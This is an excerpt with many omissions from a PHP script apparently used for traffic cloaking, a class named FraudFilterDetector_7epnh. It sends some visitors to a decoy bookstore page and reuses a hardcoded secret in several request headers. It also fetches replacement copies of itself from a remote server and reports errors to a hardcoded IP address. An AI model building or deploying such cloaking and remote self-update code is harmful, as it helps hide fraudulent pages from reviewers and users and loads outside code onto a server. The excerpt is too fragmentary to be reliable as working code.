...
class FraudFilterDetector_7epnh {
    ...
    function isSignatureValid($sign, $time) {
        $str = '90d4e267-37db-4d0f-ad1a-02d65def72c1.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.morebooks.de/store/gb/category/book-trade,-librarianship/189/43/cn,de,en,es,fr,hu,it,ru/16_by_title_ASC');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 90d4e267-37db-4d0f-ad1a-02d65def72c1',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 90d4e267-37db-4d0f-ad1a-02d65def72c1';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 90d4e267-37db-4d0f-ad1a-02d65def72c1';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=7epnh&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_7epnh = new FraudFilterDetector_7epnh();
$fraudFilterDetector_7epnh->check();
